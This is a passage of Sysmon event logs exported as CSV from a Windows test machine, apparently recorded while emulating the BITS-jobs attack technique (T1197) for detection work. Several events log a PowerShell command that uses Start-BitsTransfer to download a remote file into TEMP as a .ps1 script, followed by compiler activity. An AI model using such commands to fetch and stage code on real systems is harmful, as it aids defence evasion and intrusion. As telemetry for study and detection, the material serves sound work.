      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 22:18:20.238</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-a2ac-658c-cd01-000000000f00}</Data>
      <Data Name=""ProcessId"">5020</Data>
      <Data Name=""Image"">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe</Data>
      <Data Name=""FileVersion"">14.32.31326.0</Data>
      <Data Name=""Description"">Microsoft&#174; Resource File To COFF Object Conversion Utility</Data>
      <Data Name=""Product"">Microsoft&#174; .NET Framework</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">CVTRES.EXE</Data>
      <Data Name=""CommandLine"">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 ""/OUT:C:\Users\User\AppData\Local\Temp\RES28F0.tmp"" ""c:\Users\User\AppData\Local\Temp\CSC4340BCFC3A014F09B6A5EEBE9BE1DA51.TMP""</Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      <Data Name=""LogonId"">0x2f87b</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=8166CCB6A04B855AA918B36079C63B7D,SHA256=FD3EF1B4C91B2E85CCD05724A7CD527A3A27D7D549B0DCDB70D3D78BE120C560,IMPHASH=45A00F7304B8F089973962FBEF618959</Data>
      <Data Name=""ParentProcessGuid"">{f57bd86a-a2ac-658c-cc01-000000000f00}</Data>
      <Data Name=""ParentProcessId"">11596</Data>
      <Data Name=""ParentImage"">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe</Data>
      <Data Name=""ParentCommandLine"">""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\User\AppData\Local\Temp\rqzdeuqm.cmdline""</Data>
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-27 22:18:20.238

ProcessGuid: {f57bd86a-a2ac-658c-cd01-000000000f00}

ProcessId: 5020

Image: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe

FileVersion: 14.32.31326.0

Description: Microsoft&#174; Resource File To COFF Object Conversion Utility

Product: Microsoft&#174; .NET Framework

Company: Microsoft Corporation

OriginalFileName: CVTRES.EXE

CommandLine: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 ""/OUT:C:\Users\User\AppData\Local\Temp\RES28F0.tmp"" ""c:\Users\User\AppData\Local\Temp\CSC4340BCFC3A014F09B6A5EEBE9BE1DA51.TMP""

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=8166CCB6A04B855AA918B36079C63B7D,SHA256=FD3EF1B4C91B2E85CCD05724A7CD527A3A27D7D549B0DCDB70D3D78BE120C560,IMPHASH=45A00F7304B8F089973962FBEF618959

ParentProcessGuid: {f57bd86a-a2ac-658c-cc01-000000000f00}

ParentProcessId: 11596

ParentImage: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe

ParentCommandLine: ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\User\AppData\Local\Temp\rqzdeuqm.cmdline""

ParentUser: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\User\AppData\Local\Temp\rqzdeuqm.cmdline""",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Visual C# Command Line Compiler,1,19581,4.8.9032.0 built by: NET481REL1,"MD5=0700180046633A40D24729AE8CACC158,SHA256=A725546BDE53F1AD533E74ABB01DD5ED5F07B171F5C284738DA88F6CE478CF5F,IMPHASH=2E6A9097FBA347A254DAC72662FE1259",C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe,Medium,0x8000000000000000,Information,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,"Process Create:

RuleName: -

UtcTime: 2023-12-27 22:18:20.153

ProcessGuid: {f57bd86a-a2ac-658c-cc01-000000000f00}

ProcessId: 11596

Image: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe

FileVersion: 4.8.9032.0 built by: NET481REL1

Description: Visual C# Command Line Compiler

Product: Microsoft® .NET Framework

Company: Microsoft Corporation

OriginalFileName: csc.exe

CommandLine: ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\User\AppData\Local\Temp\rqzdeuqm.cmdline""

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=0700180046633A40D24729AE8CACC158,SHA256=A725546BDE53F1AD533E74ABB01DD5ED5F07B171F5C284738DA88F6CE478CF5F,IMPHASH=2E6A9097FBA347A254DAC72662FE1259

ParentProcessGuid: {f57bd86a-a2aa-658c-ca01-000000000f00}

ParentProcessId: 2008

ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

ParentCommandLine: ""powershell.exe"" & {Start-BitsTransfer -Priority foreground -Source https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md -Destination $env:TEMP\bitsadmin2_flag.ps1}

ParentUser: WINDEV2309EVAL\User",Info,csc.exe,"""powershell.exe"" & {Start-BitsTransfer -Priority foreground -Source https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md -Destination $env:TEMP\bitsadmin2_flag.ps1}",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,{f57bd86a-a2aa-658c-ca01-000000000f00},2008,WINDEV2309EVAL\User,{f57bd86a-a2ac-658c-cc01-000000000f00},3588,11596,Microsoft® .NET Framework,,,,"
      ",-,2023-12-27T22:18:20.1545610Z,,Process Create (rule: ProcessCreate),1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 22:18:20.153,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T22:18:20.1545610Z""/>
      <EventRecordID>19581</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 22:18:20.153</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-a2ac-658c-cc01-000000000f00}</Data>
      <Data Name=""ProcessId"">11596</Data>
      <Data Name=""Image"">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe</Data>
      <Data Name=""FileVersion"">4.8.9032.0 built by: NET481REL1</Data>
      <Data Name=""Description"">Visual C# Command Line Compiler</Data>
      <Data Name=""Product"">Microsoft&#174; .NET Framework</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">csc.exe</Data>
      <Data Name=""CommandLine"">""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\User\AppData\Local\Temp\rqzdeuqm.cmdline""</Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      <Data Name=""LogonId"">0x2f87b</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=0700180046633A40D24729AE8CACC158,SHA256=A725546BDE53F1AD533E74ABB01DD5ED5F07B171F5C284738DA88F6CE478CF5F,IMPHASH=2E6A9097FBA347A254DAC72662FE1259</Data>
      <Data Name=""ParentProcessGuid"">{f57bd86a-a2aa-658c-ca01-000000000f00}</Data>
      <Data Name=""ParentProcessId"">2008</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""ParentCommandLine"">""powershell.exe"" &amp; {Start-BitsTransfer -Priority foreground -Source https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md -Destination $env:TEMP\bitsadmin2_flag.ps1}</Data>
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-27 22:18:20.153

ProcessGuid: {f57bd86a-a2ac-658c-cc01-000000000f00}

ProcessId: 11596

Image: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe

FileVersion: 4.8.9032.0 built by: NET481REL1

Description: Visual C# Command Line Compiler

Product: Microsoft&#174; .NET Framework

Company: Microsoft Corporation

OriginalFileName: csc.exe

CommandLine: ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\User\AppData\Local\Temp\rqzdeuqm.cmdline""

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=0700180046633A40D24729AE8CACC158,SHA256=A725546BDE53F1AD533E74ABB01DD5ED5F07B171F5C284738DA88F6CE478CF5F,IMPHASH=2E6A9097FBA347A254DAC72662FE1259

ParentProcessGuid: {f57bd86a-a2aa-658c-ca01-000000000f00}

ParentProcessId: 2008

ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

ParentCommandLine: ""powershell.exe"" &amp; {Start-BitsTransfer -Priority foreground -Source https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md -Destination $env:TEMP\bitsadmin2_flag.ps1}

ParentUser: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,2023-12-27 22:18:20.144,,,11,19580,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,0x8000000000000000,Information,,,"File created:

RuleName: -

UtcTime: 2023-12-27 22:18:20.144

ProcessGuid: {f57bd86a-a2aa-658c-ca01-000000000f00}

ProcessId: 2008

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

TargetFilename: C:\Users\User\AppData\Local\Temp\rqzdeuqm.cmdline

CreationUtcTime: 2023-12-27 22:18:20.144

User: WINDEV2309EVAL\User",Info,,,,,,,{f57bd86a-a2aa-658c-ca01-000000000f00},3588,2008,,,,,"
      ",-,2023-12-27T22:18:20.1516001Z,C:\Users\User\AppData\Local\Temp\rqzdeuqm.cmdline,File created (rule: FileCreate),,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 22:18:20.144,2,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>11</EventID>
      <Version>2</Version>
      <Level>4</Level>
      <Task>11</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T22:18:20.1516001Z""/>
      <EventRecordID>19580</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 22:18:20.144</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-a2aa-658c-ca01-000000000f00}</Data>
      <Data Name=""ProcessId"">2008</Data>
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""TargetFilename"">C:\Users\User\AppData\Local\Temp\rqzdeuqm.cmdline</Data>
      <Data Name=""CreationUtcTime"">2023-12-27 22:18:20.144</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>File created:

RuleName: -

UtcTime: 2023-12-27 22:18:20.144

ProcessGuid: {f57bd86a-a2aa-658c-ca01-000000000f00}

ProcessId: 2008

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

TargetFilename: C:\Users\User\AppData\Local\Temp\rqzdeuqm.cmdline

CreationUtcTime: 2023-12-27 22:18:20.144

User: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>File created (rule: FileCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,2023-12-27 22:18:20.144,,,11,19579,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,0x8000000000000000,Information,,,"File created:

RuleName: DLL

UtcTime: 2023-12-27 22:18:20.144

ProcessGuid: {f57bd86a-a2aa-658c-ca01-000000000f00}

ProcessId: 2008

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

TargetFilename: C:\Users\User\AppData\Local\Temp\rqzdeuqm.dll

CreationUtcTime: 2023-12-27 22:18:20.144

User: WINDEV2309EVAL\User",Info,,,,,,,{f57bd86a-a2aa-658c-ca01-000000000f00},3588,2008,,,,,"
      ",DLL,2023-12-27T22:18:20.1511590Z,C:\Users\User\AppData\Local\Temp\rqzdeuqm.dll,File created (rule: FileCreate),,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 22:18:20.144,2,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>11</EventID>
      <Version>2</Version>
      <Level>4</Level>
      <Task>11</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T22:18:20.1511590Z""/>
      <EventRecordID>19579</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">DLL</Data>
      <Data Name=""UtcTime"">2023-12-27 22:18:20.144</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-a2aa-658c-ca01-000000000f00}</Data>
      <Data Name=""ProcessId"">2008</Data>
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""TargetFilename"">C:\Users\User\AppData\Local\Temp\rqzdeuqm.dll</Data>
      <Data Name=""CreationUtcTime"">2023-12-27 22:18:20.144</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>File created:

RuleName: DLL

UtcTime: 2023-12-27 22:18:20.144

ProcessGuid: {f57bd86a-a2aa-658c-ca01-000000000f00}

ProcessId: 2008

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

TargetFilename: C:\Users\User\AppData\Local\Temp\rqzdeuqm.dll

CreationUtcTime: 2023-12-27 22:18:20.144

User: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>File created (rule: FileCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,2023-12-27 22:18:18.704,,,11,19578,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,0x8000000000000000,Information,,,"File created:

RuleName: -

UtcTime: 2023-12-27 22:18:18.704

ProcessGuid: {f57bd86a-a2aa-658c-ca01-000000000f00}

ProcessId: 2008

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

TargetFilename: C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_uspbqexy.y2p.ps1

CreationUtcTime: 2023-12-27 22:18:18.704

User: WINDEV2309EVAL\User",Info,,,,,,,{f57bd86a-a2aa-658c-ca01-000000000f00},3588,2008,,,,,"
      ",-,2023-12-27T22:18:18.7077985Z,C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_uspbqexy.y2p.ps1,File created (rule: FileCreate),,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 22:18:18.704,2,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>11</EventID>
      <Version>2</Version>
      <Level>4</Level>
      <Task>11</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T22:18:18.7077985Z""/>
      <EventRecordID>19578</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 22:18:18.704</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-a2aa-658c-ca01-000000000f00}</Data>
      <Data Name=""ProcessId"">2008</Data>
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""TargetFilename"">C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_uspbqexy.y2p.ps1</Data>
      <Data Name=""CreationUtcTime"">2023-12-27 22:18:18.704</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>File created:

RuleName: -

UtcTime: 2023-12-27 22:18:18.704

ProcessGuid: {f57bd86a-a2aa-658c-ca01-000000000f00}

ProcessId: 2008

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

TargetFilename: C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_uspbqexy.y2p.ps1

CreationUtcTime: 2023-12-27 22:18:18.704

User: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>File created (rule: FileCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
